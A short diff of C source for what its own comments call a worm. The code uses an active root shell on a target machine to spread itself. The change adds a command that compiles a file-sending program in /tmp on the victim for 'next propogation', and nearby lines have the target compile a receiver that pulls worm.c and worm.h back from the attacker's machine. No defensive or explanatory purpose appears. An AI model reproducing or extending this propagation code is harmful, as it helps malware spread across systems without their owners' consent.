@@ -59,7 +59,7 @@ void get_local_ip(char *ip) {
 	close(sock);
 }
 
-/**
+/*
  * Deploys receive_file_bsd.c on target machine
  * sock - The active root shell
  * my_ip - The IP of the current machine for the target to connect back to
@@ -214,7 +214,9 @@ void infect(char *ip, char *my_ip) {
 		execv("./send_file_over_socket", argv);
 		exit(1);  /* If execv fails */
 	}
-	/* Parent continues with worm propagation on target */
+
+    //compile send_file_over_socket on target for next propogation
+	write_to_sock(sock, "cc /tmp/send_file_over_socket.c -o /tmp/send_file_over_socket\n");
 
     // Compile and run receive_file, should pull in worm.c, worm.h, and send_file_over_socket.c from attacker
 	printf("[*] Compiling receive_file.c on target...\n");
